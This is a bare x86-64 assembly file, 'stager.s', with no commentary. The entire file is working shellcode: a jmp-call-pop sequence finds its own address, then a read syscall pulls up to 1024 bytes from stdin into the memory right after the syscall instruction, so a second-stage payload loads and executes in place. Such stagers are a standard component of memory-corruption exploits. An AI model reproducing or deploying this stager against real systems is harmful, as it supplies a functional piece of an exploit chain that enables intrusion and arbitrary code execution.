; stager.s
BITS 64
global _start

_start:
    jmp stager1
    pc:
    pop rsi
    jmp stager2
    stager1:
    xor rax,rax
    push rax
    pop rdi
    push rax
    pop rdx
    inc rdx
    shl rdx,10
    call pc
    stager2:
    add rsi,6
    syscall
